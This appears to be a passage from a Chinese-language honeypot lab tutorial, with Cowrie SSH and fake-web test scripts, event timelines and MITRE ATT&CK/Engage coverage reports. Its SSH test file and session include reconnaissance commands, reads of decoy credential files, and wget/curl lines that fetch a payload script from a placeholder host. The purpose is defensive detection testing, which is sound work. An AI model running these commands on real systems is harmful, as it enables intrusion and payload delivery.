| T1082 System Information Discovery | 11 |
| T1105 Ingress Tool Transfer | 4 |
| T1110 Brute Force | 1 |
| T1552 Unsecured Credentials | 6 |
| T1595 Active Scanning | 5 |

## 6. MITRE Engage Coverage

### By Goal

| Goal | Detection Count |
| --- | --- |
| Affect | 4 |
| Elicit | 12 |
| Expose | 6 |
| Understand | 16 |

### By Activity

| Activity | Detection Count |
| --- | --- |
| Affect: Adversary Direction | 4 |
| Elicit: Credential Collection | 6 |
| Elicit: Reveal Adversary Intent | 6 |
| Expose: Expose Decoy Service | 6 |
| Understand: Collect Adversary Behavior | 16 |
```
- 查看 timeline：
```
tail -n 120 /opt/deception-lab/reports/timeline.md

# 執行結果：
lss@lss:/opt/deception-lab $ tail -n 120 /opt/deception-lab/reports/timeline.md

### 20:13:55 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/login`
- Severity: `info`
- Tags: `web, request`
- Detections: none

### 20:13:55 UTC

- Event: **web_login_attempt** from `fake-web` src_ip=`172.18.0.1`; username=`backup`
- Severity: `high`
- Tags: `web, login, honeycredential`
- Detections:
  - `WEB_HONEYCREDENTIAL_USED` / Web honeycredential used / severity=`high`
    - ATT&CK: `T1552` Unsecured Credentials / tactic=`Credential Access`
    - Engage: goal=`Elicit` activity=`Credential Collection`

### 20:22:22 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/download/secrets.txt`
- Severity: `info`
- Tags: `web, request`
- Detections: none

### 20:22:22 UTC

- Event: **web_honeyfile_access** from `fake-web` src_ip=`172.18.0.1`; path=`/download/secrets.txt`; filename=`secrets.txt`
- Severity: `high`
- Tags: `web, honeyfile, download`
- Detections:
  - `WEB_HONEYFILE_ACCESS` / Web honeyfile accessed / severity=`high`
    - ATT&CK: `T1005` Data from Local System / tactic=`Collection`
    - Engage: goal=`Understand` activity=`Collect Adversary Behavior`

### 20:22:28 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/download/backup_config.ini`
- Severity: `info`
- Tags: `web, request`
- Detections: none

### 20:22:28 UTC

- Event: **web_honeyfile_access** from `fake-web` src_ip=`172.18.0.1`; path=`/download/backup_config.ini`; filename=`backup_config.ini`
- Severity: `high`
- Tags: `web, honeyfile, download`
- Detections:
  - `WEB_HONEYFILE_ACCESS` / Web honeyfile accessed / severity=`high`
    - ATT&CK: `T1005` Data from Local System / tactic=`Collection`
    - Engage: goal=`Understand` activity=`Collect Adversary Behavior`

### 20:22:35 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/download/database_passwords.txt`
- Severity: `info`
- Tags: `web, request`
- Detections: none

### 20:22:35 UTC

- Event: **web_honeyfile_access** from `fake-web` src_ip=`172.18.0.1`; path=`/download/database_passwords.txt`; filename=`database_passwords.txt`
- Severity: `high`
- Tags: `web, honeyfile, download`
- Detections:
  - `WEB_HONEYFILE_ACCESS` / Web honeyfile accessed / severity=`high`
    - ATT&CK: `T1005` Data from Local System / tactic=`Collection`
    - Engage: goal=`Understand` activity=`Collect Adversary Behavior`

## 2026-05-22

### 21:41:34 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/.env`
- Severity: `info`
- Tags: `web, request, scanner-probe`
- Detections:
  - `WEB_SCANNER_PROBE` / Web scanner probe / severity=`medium`
    - ATT&CK: `T1595` Active Scanning / tactic=`Reconnaissance`
    - Engage: goal=`Expose` activity=`Expose Decoy Service`

### 21:41:50 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/wp-admin`
- Severity: `info`
- Tags: `web, request, scanner-probe`
- Detections:
  - `WEB_SCANNER_PROBE` / Web scanner probe / severity=`medium`
    - ATT&CK: `T1595` Active Scanning / tactic=`Reconnaissance`
    - Engage: goal=`Expose` activity=`Expose Decoy Service`

### 21:42:05 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/phpmyadmin`
- Severity: `info`
- Tags: `web, request, scanner-probe`
- Detections:
  - `WEB_SCANNER_PROBE` / Web scanner probe / severity=`medium`
    - ATT&CK: `T1595` Active Scanning / tactic=`Reconnaissance`
    - Engage: goal=`Expose` activity=`Expose Decoy Service`

### 21:42:11 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/server-status`
- Severity: `info`
- Tags: `web, request, scanner-probe`
- Detections:
  - `WEB_SCANNER_PROBE` / Web scanner probe / severity=`medium`
    - ATT&CK: `T1595` Active Scanning / tactic=`Reconnaissance`
    - Engage: goal=`Expose` activity=`Expose Decoy Service`

### 21:42:18 UTC

- Event: **web_request** from `fake-web` src_ip=`172.18.0.1`; path=`/actuator/env`
- Severity: `info`
- Tags: `web, request, scanner-probe`
- Detections:
  - `WEB_SCANNER_PROBE` / Web scanner probe / severity=`medium`
    - ATT&CK: `T1595` Active Scanning / tactic=`Reconnaissance`
    - Engage: goal=`Expose` activity=`Expose Decoy Service`
```

### Step 11.18：建立攻擊情境測試腳本
```
為了以後快速重跑測試，我們建立一個 Web 測試腳本。
SSH 測試仍建議你手動做，因為 SSH login 需要互動輸入密碼。
```
- 建立：
```
cat > /opt/deception-lab/scripts/test_web_scenarios.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://127.0.0.1:8080"

echo "[+] Testing Web login failure..."
curl -s -X POST "$BASE_URL/login" \
  -d "username=admin" \
  -d "password=wrongpassword" \
  -o /tmp/web-login-failed.html

echo "[+] Testing Web honeycredential..."
curl -s -X POST "$BASE_URL/login" \
  -d "username=backup" \
  -d "password=Backup2026!" \
  -o /tmp/web-login-honeycredential.html

echo "[+] Testing Web honeyfile downloads..."
curl -s "$BASE_URL/download/secrets.txt" -o /tmp/secrets.txt
curl -s "$BASE_URL/download/backup_config.ini" -o /tmp/backup_config.ini
curl -s "$BASE_URL/download/database_passwords.txt" -o /tmp/database_passwords.txt

echo "[+] Testing Web scanner paths..."
curl -s -I "$BASE_URL/.env" >/dev/null || true
curl -s -I "$BASE_URL/wp-admin" >/dev/null || true
curl -s -I "$BASE_URL/phpmyadmin" >/dev/null || true
curl -s -I "$BASE_URL/server-status" >/dev/null || true
curl -s -I "$BASE_URL/actuator/env" >/dev/null || true

rm -f /tmp/secrets.txt /tmp/backup_config.ini /tmp/database_passwords.txt

echo "[+] Web scenario tests completed."
echo
echo "[+] Last auth events:"
tail -n 5 /opt/deception-lab/data/logs/web/web_auth.jsonl || true

echo
echo "[+] Last access events:"
tail -n 10 /opt/deception-lab/data/logs/web/web_access.jsonl || true
EOF
```
- 設定可執行：
```
chmod +x /opt/deception-lab/scripts/test_web_scenarios.sh
```
- 執行：
```
/opt/deception-lab/scripts/test_web_scenarios.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/test_web_scenarios.sh
[+] Testing Web login failure...
[+] Testing Web honeycredential...
[+] Testing Web honeyfile downloads...
[+] Testing Web scanner paths...
[+] Web scenario tests completed.

[+] Last auth events:
{"timestamp": "2026-05-12T18:41:52.679019+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
{"timestamp": "2026-05-21T20:10:34.117443+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
{"timestamp": "2026-05-21T20:13:55.354969+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
{"timestamp": "2026-05-22T22:26:28.303686+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
{"timestamp": "2026-05-22T22:26:28.316795+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}

[+] Last access events:
{"timestamp": "2026-05-22T22:26:28.332142+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "secrets.txt", "path": "/download/secrets.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-22T22:26:28.344772+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/backup_config.ini", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-22T22:26:28.345003+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "backup_config.ini", "path": "/download/backup_config.ini", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-22T22:26:28.357376+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/database_passwords.txt", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
{"timestamp": "2026-05-22T22:26:28.357609+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "database_passwords.txt", "path": "/download/database_passwords.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
{"timestamp": "2026-05-22T22:26:28.370248+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/.env", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T22:26:28.382569+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/wp-admin", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T22:26:28.395176+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/phpmyadmin", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T22:26:28.404555+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/server-status", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
{"timestamp": "2026-05-22T22:26:28.413655+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/actuator/env", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
```

### Step 11.19：建立 SSH 測試說明檔
因為 SSH 測試需要互動輸入密碼，所以用說明檔記錄。
- 執行：
```
cat > /opt/deception-lab/data/test-scenarios/ssh_test_commands.md <<'EOF'
# SSH Test Commands for Cowrie

Target:

```bash
ssh -p 2222 backup@127.0.0.1
Backup2026!
whoami
id
pwd
ls
uname -a
ps aux
cat /home/admin/secrets.txt
cat /home/admin/backup_config.ini
cat /home/admin/database_passwords.txt
cat /home/backup/backup_jobs.txt
cat /etc/edge-gateway/app.conf
wget http://192.0.2.123/a.sh
curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
chmod +x /tmp/payload.sh
exit

Expected detections:
SSH_HONEYCREDENTIAL_LOGIN
SSH_RECON_COMMAND
SSH_HONEYFILE_ACCESS
SSH_TOOL_TRANSFER_COMMAND
EOF
```
- After logging into Cowrie, run:
```
# 登入 Cowrie 後，執行：
ssh -p 2222 backup@127.0.0.1
Password:Backup2026!

# 執行：
whoami
id
pwd
ls
uname -a
ps aux
cat /home/admin/secrets.txt
cat /home/admin/backup_config.ini
cat /home/admin/database_passwords.txt
cat /home/backup/backup_jobs.txt
cat /etc/edge-gateway/app.conf
wget http://192.0.2.123/a.sh
curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
chmod +x /tmp/payload.sh
exit

# 執行結果：
lss@lss:/opt/deception-lab $ ssh -p 2222 backup@127.0.0.1
backup@127.0.0.1's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
backup@svr04:~$ whoami
backup
backup@svr04:~$ id
uid=34(backup) gid=34(backup) groups=34(backup)
backup@svr04:~$ pwd
/var/backups
backup@svr04:~$ ls
backup@svr04:~$ uname -a
Linux svr04 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
backup@svr04:~$ ps aux
USER         PID   %CPU       %MEM       VSZ       RSS       TTY     STAT  START TIME  COMMAND
root         1     0.0        0.89       180281344 4587520   ?       Ss    Jul22 0.48  /lib/systemd/systemd --system --deserialize 20
root         2     0.0        0.0        0         0         ?       S<    Jul22 0.0   [kthreadd]
root         3     0.0        0.0        0         0         ?       S<    Jul22 0.0   [ksoftirqd/0]
root         5     0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/0:0H]
root         7     0.0        0.0        0         0         ?       Ss    Jul22 0.0   [rcu_sched]
root         8     0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [rcu_bh]
root         9     0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [migration/0]
root         10    0.0        0.0        0         0         ?       S<    Jul22 0.0   [watchdog/0]
root         11    0.0        0.0        0         0         ?       D<    Jul22 0.0   [watchdog/1]
root         12    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [migration/1]
root         13    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [ksoftirqd/1]
root         15    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/1:0H]
root         16    0.0        0.0        0         0         ?       D<    Jul22 0.0   [khelper]
root         17    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kdevtmpfs]
root         18    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [netns]
root         19    0.0        0.0        0         0         ?       D<    Jul22 0.0   [khungtaskd]
root         20    0.0        0.0        0         0         ?       S<    Jul22 0.0   [writeback]
root         21    0.0        0.0        0         0         ?       S<    Jul22 0.0   [ksmd]
root         22    0.0        0.0        0         0         ?       S<    Jul22 0.0   [crypto]
root         23    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kintegrityd]
root         24    0.0        0.0        0         0         ?       D<    Jul22 0.0   [bioset]
root         25    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kblockd]
root         27    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kswapd0]
root         28    0.0        0.0        0         0         ?       S<    Jul22 0.0   [vmstat]
root         29    0.0        0.0        0         0         ?       S<    Jul22 0.0   [fsnotify_mark]
root         35    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kthrotld]
root         37    0.0        0.0        0         0         ?       S<    Jul22 0.0   [ipv6_addrconf]
root         38    0.0        0.0        0         0         ?       D<    Jul22 0.0   [deferwq]
root         39    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/u4:1]
root         74    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [ata_sff]
root         75    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kpsmoused]
root         78    0.0        0.0        0         0         ?       S<    Jul22 0.0   [scsi_eh_0]
root         79    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [scsi_tmf_0]
root         80    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kworker/u4:2]
root         83    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kworker/1:1H]
root         88    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/0:1H]
root         103   0.0        0.0        0         0         ?       D<    Jul22 0.0   [jbd2/sda1-8]
root         104   0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [ext4-rsv-conver]
root         135   0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kauditd]
root         141   0.0        0.43       41754624  2211840   ?       Ss    Jul22 0.05  /lib/systemd/systemd-udevd
root         150   0.0        1.12       38326272  5820416   ?       S<    Jul22 0.16  /lib/systemd/systemd-journald
root         360   0.0        0.35       37969920  1789952   ?       Ss    Jul22 0.0   /sbin/rpcbind -w
statd        382   0.0        0.34       38174720  1748992   ?       Ss+   Jul22 0.0   /sbin/rpc.statd
root         387   0.0        0.0        0         0         ?       D<    Jul22 0.0   [rpciod]
root         392   0.0        0.0        0         0         ?       Ss    Jul22 0.0   [nfsiod]
root         407   0.0        0.0        23916544  12288     ?       Ss    Jul22 0.0   /usr/sbin/rpc.idmapd
root         413   0.0        0.31       19480576  1597440   ?       Ss    Jul22 0.0   /usr/sbin/atd -f
root         414   0.0        0.51       28135424  2641920   ?       Ss    Jul22 0.01  /usr/sbin/cron -f
root         417   0.0        0.34       20332544  1757184   ?       Ss+   Jul22 0.05  /lib/systemd/systemd-logind
messagebus   419   0.0        0.51       43245568  2646016   ?       Ss+   Jul22 0.52  /usr/bin/dbus-daemon --system --address=systemd: --nofork
root         425   0.0        0.4        264880128 2088960   ?       D<    Jul22 0.04  /usr/sbin/rsyslogd -n
root         427   0.0        0.31       4358144   1585152   ?       Ss    Jul22 0.0   /usr/sbin/acpid
root         442   0.0        0.33       14761984  1708032   tty1    Ss    Jul22 0.0   /sbin/agetty --noclear tty1 linux
root         448   0.0        0.59       56508416  3067904   ?       D<    Jul22 0.01  /usr/sbin/sshd -D
Debian-exim  682   0.0        0.42       54530048  2154496   ?       D<    Jul22 0.0   /usr/sbin/exim4 -bd -q30m
root         697   0.0        0.11       26009600  589824    ?       Ss    Jul22 0.0   dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/
root         8574  0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [iprt-VBoxWQueue]
root         8611  0.0        0.0        0         0         ?       D<    Jul22 0.0   [ttm_swap]
root         8743  0.0        0.21       307101696 1064960   ?       Ss    Jul22 0.17  /usr/sbin/VBoxService --pidfile /var/run/vboxadd-service.
root         9030  0.0        0.47       26009600  2424832   ?       Ss+   Jul22 0.0   dhclient -v -pf /run/dhclient.eth1.pid -lf /var/lib/dhcp/
root         21704 0.0        0.29       4440064   1507328   ?       D<    Jul22 0.0   /bin/sh /usr/bin/mysqld_safe
mysql        22049 0.0        9.28       137470771248103424  ?       S<    Jul22 5.91  /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql
ejabberd     25061 0.0        0.05       27955200  233472    ?       Ss    Jul23 0.14  /usr/lib/erlang/erts-6.2/bin/epmd -daemon
root         25065 0.0        0.0        0         0         ?       Ss+   Jul23 0.0   [kworker/0:0]
ejabberd     25095 0.0        8.87       968404992 45989888  ?       Ss    Jul23 3.41  /usr/lib/erlang/erts-6.2/bin/beam.smp -K true -P 250000 -
root         25970 0.0        0.0        0         0         ?       D<    Jul23 0.0   [kworker/1:0]
root         26418 0.0        0.6        93380608  3092480   ?       Ss+   Jul23 0.0   nginx: master process /usr/sbin/nginx -g daemon on; maste
www-data     26419 0.0        0.73       93704192  3760128   ?       Ss+   Jul23 0.29  nginx: worker process
www-data     26420 0.0        0.73       93704192  3760128   ?       D<    Jul23 0.36  nginx: worker process
www-data     26421 0.0        0.73       93704192  3760128   ?       Ss+   Jul23 0.2   nginx: worker process
www-data     26422 0.0        0.73       93704192  3760128   ?       D<    Jul23 0.45  nginx: worker process
root         28001 0.0        0.0        0         0         ?       Ss    Jul23 0.0   [kworker/0:2]
root         28002 0.0        0.0        0         0         ?       Ss    Jul23 0.0   [kworker/1:1]
root         7636  0.0        0.1        5416      1024      ?       Ss    Jul22 0:00  /usr/sbin/sshd: backup@pts/0
backup       7641  0.0        0.1        5416      1024      pts/0   Ss    06:30 0:00  -bash
backup       7643  0.0        0.1        2435      929       pts/0   Ss    06:30 0:00  ps aux
backup@svr04:~$ cat /home/admin/secrets.txt
cat: /home/admin/secrets.txt: No such file or directory
backup@svr04:~$ cat /home/admin/backup_config.ini
cat: /home/admin/backup_config.ini: No such file or directory
backup@svr04:~$ cat /home/admin/database_passwords.txt
cat: /home/admin/database_passwords.txt: No such file or directory
backup@svr04:~$ cat /home/backup/backup_jobs.txt
cat: /home/backup/backup_jobs.txt: No such file or directory
backup@svr04:~$ cat /etc/edge-gateway/app.conf
cat: /etc/edge-gateway/app.conf: No such file or directory
backup@svr04:~$ wget http://192.0.2.123/a.sh
--2026-05-23 06:39:40--  http://192.0.2.123/a.sh
Connecting to 192.0.2.123:80... connected.
HTTP request sent, awaiting response... ^C
backup@svr04:~$ curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
curl: (7) Failed to connect to 192.0.2.123 port 80: Operation timed out
backup@svr04:~$
backup@svr04:~$ HTTP request sent, awaiting response... ^C
-bash: HTTP: command not found
backup@svr04:~$ chmod +x /tmp/payload.sh
chmod: cannot access '/tmp/payload.sh': No such file or directory
backup@svr04:~$ exit
Connection to 127.0.0.1 closed.
```
- 執行後確認檔案：
```
cat /opt/deception-lab/data/test-scenarios/ssh_test_commands.md
```

### Step 11.20：建立測試後檢查腳本
- 建立：
```
cat > /opt/deception-lab/scripts/check_phase11_results.sh <<'EOF'
#!/usr/bin/env bash
set -euo pipefail

echo "=== Refreshing final report ==="
/opt/deception-lab/scripts/generate_report.sh >/tmp/phase11_generate_report.log

echo
echo "=== Report Summary ==="
cat /opt/deception-lab/reports/report.json | jq '.summary'

echo
echo "=== Detection Rule Counts ==="
grep -o '"rule_id": "[^"]*"' /opt/deception-lab/data/events/detections.jsonl | sort | uniq -c

echo
echo "=== ATT&CK Coverage ==="
cat /opt/deception-lab/data/events/attack_coverage.json | jq '.detections_by_tactic, .detections_by_technique'

echo
echo "=== Engage Coverage ==="
cat /opt/deception-lab/data/events/engage_coverage.json | jq '.detections_by_goal, .detections_by_activity'

echo
echo "=== Latest Report Files ==="
ls -lah /opt/deception-lab/reports
EOF
```
- 設定可執行：
```
chmod +x /opt/deception-lab/scripts/check_phase11_results.sh
```
- 執行：
```
/opt/deception-lab/scripts/check_phase11_results.sh

# 執行結果：
lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/check_phase11_results.sh
=== Refreshing final report ===
/opt/deception-lab/parser/generate_timeline.py:93: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  lines.append(f"Generated at: {datetime.utcnow().isoformat()}Z")

=== Report Summary ===
{
  "detections_by_rule": {
    "SSH_HONEYCREDENTIAL_LOGIN": 4,
    "SSH_HONEYFILE_ACCESS": 11,
    "SSH_LOGIN_FAILED": 1,
    "SSH_RECON_COMMAND": 17,
    "SSH_TOOL_TRANSFER_COMMAND": 7,
    "WEB_HONEYCREDENTIAL_USED": 4,
    "WEB_HONEYFILE_ACCESS": 8,
    "WEB_SCANNER_PROBE": 10
  },
  "detections_by_severity": {
    "high": 34,
    "medium": 28
  },
  "events_by_source": {
    "cowrie": 58,
    "fake-web": 53
  },
  "events_by_type": {
    "ssh_command": 44,
    "ssh_connection": 5,
    "ssh_login_failed": 1,
    "ssh_login_success": 4,
    "ssh_logout": 4,
    "web_honeyfile_access": 8,
    "web_login_attempt": 8,
    "web_request": 37
  },
  "honeycredential_detections": 8,
  "honeyfile_detections": 19,
  "total_detections": 62,
  "total_events": 111
}

=== Detection Rule Counts ===
      4 "rule_id": "SSH_HONEYCREDENTIAL_LOGIN"
     11 "rule_id": "SSH_HONEYFILE_ACCESS"
      1 "rule_id": "SSH_LOGIN_FAILED"
     17 "rule_id": "SSH_RECON_COMMAND"
      7 "rule_id": "SSH_TOOL_TRANSFER_COMMAND"
      4 "rule_id": "WEB_HONEYCREDENTIAL_USED"
      8 "rule_id": "WEB_HONEYFILE_ACCESS"
     10 "rule_id": "WEB_SCANNER_PROBE"

=== ATT&CK Coverage ===
{
  "Collection": 19,
  "Command and Control": 7,
  "Credential Access": 9,
  "Discovery": 17,
  "Reconnaissance": 10
}
{
  "T1005 Data from Local System": 19,
  "T1082 System Information Discovery": 17,
  "T1105 Ingress Tool Transfer": 7,
  "T1110 Brute Force": 1,
  "T1552 Unsecured Credentials": 8,
  "T1595 Active Scanning": 10
}

=== Engage Coverage ===
{
  "Affect": 7,
  "Elicit": 19,
  "Expose": 11,
  "Understand": 25
}
{
  "Affect: Adversary Direction": 7,
  "Elicit: Credential Collection": 8,
  "Elicit: Reveal Adversary Intent": 11,
  "Expose: Expose Decoy Service": 11,
  "Understand: Collect Adversary Behavior": 25
}

=== Latest Report Files ===
total 68K
drwxrwxr-x 2 lss lss 4.0K May 22 03:11 .
drwxr-xr-x 8 lss lss 4.0K May 22 03:32 ..
-rw-rw-r-- 1 lss lss 2.4K May 23 06:50 mapping_report.md
-rw-rw-r-- 1 lss lss  13K May 23 06:50 report.json
-rw-rw-r-- 1 lss lss 5.9K May 23 06:50 report.md
-rw-rw-r-- 1 lss lss  32K May 23 06:50 timeline.md
```

### Step 11.21：建立第十一階段完成紀錄
如果你已經完成測試，且 detections 有更新，建立：
```
cat > /opt/deception-lab/PHASE11_READY.md <<'EOF'
# Phase 11 Ready

Controlled attack scenario testing has been completed.

Completed test scenarios:

- SSH failed login test
- SSH honeycredential login test
- SSH reconnaissance command test
- SSH honeyfile access test
- SSH tool transfer command test
- Web failed login test
- Web honeycredential use test
- Web honeyfile download test
- Web scanner path probe test
- Log collection refreshed
- Parser rerun
- MITRE mapping rerun
- Final reports regenerated

Main scripts:

- /opt/deception-lab/scripts/test_web_scenarios.sh
- /opt/deception-lab/scripts/check_phase11_results.sh

Main report outputs:

- /opt/deception-lab/reports/report.md
- /opt/deception-lab/reports/report.json
- /opt/deception-lab/reports/timeline.md

Next phase:

Phase 12 - Safety hardening and future expansion.
EOF
```
- 確認：
```
cat /opt/deception-lab/PHASE11_READY.md

# 執行結果：
lss@lss:/opt/deception-lab $ cat /opt/deception-lab/PHASE11_READY.md
# Phase 11 Ready

Controlled attack scenario testing has been completed.

Completed test scenarios:

- SSH failed login test
- SSH honeycredential login test
- SSH reconnaissance command test
- SSH honeyfile access test
- SSH tool transfer command test
- Web failed login test
- Web honeycredential use test
- Web honeyfile download test
- Web scanner path probe test
- Log collection refreshed
- Parser rerun
- MITRE mapping rerun
- Final reports regenerated

Main scripts:

- /opt/deception-lab/scripts/test_web_scenarios.sh
- /opt/deception-lab/scripts/check_phase11_results.sh

Main report outputs:

- /opt/deception-lab/reports/report.md
- /opt/deception-lab/reports/report.json
- /opt/deception-lab/reports/timeline.md

Next phase:

Phase 12 - Safety hardening and future expansion.
```







